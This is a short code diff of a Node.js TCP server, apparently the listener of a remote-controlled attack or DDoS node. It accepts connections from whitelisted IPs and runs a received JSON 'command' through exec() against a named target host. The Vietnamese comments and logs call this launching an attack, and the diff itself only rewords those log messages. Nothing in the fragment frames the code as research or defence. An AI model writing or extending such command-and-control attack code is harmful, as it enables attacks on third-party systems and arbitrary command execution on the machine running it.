@@ -9,7 +9,7 @@ const server = net.createServer((socket) => {
 
     const remoteAddress = socket.remoteAddress.replace(/^.*:/, '');
     if (!allowed_ips.includes(remoteAddress)) {
-        console.log(`Connection from ${remoteAddress} not allowed`);
+        console.log(`Không cho phép kết nối từ ${remoteAddress}`);
         socket.write('failed');
         socket.end();
         return;
@@ -27,11 +27,11 @@ const server = net.createServer((socket) => {
             //khởi động cuộc tấn công
             exec(json.command, function (error, stdout, stderr) {});
 
-            console.log(`bắt đầu tấn công vào ${json.host}`)
+            console.log(`bắt đầu tấn công ${json.host}`)
         
             socket.write('success');
         } catch (e) {
-            console.log(`không bắt đầu tấn công được ${e}`)
+            console.log(`không gửi tấn công được ${e}`)
         
             socket.write('failed');
             socket.end();
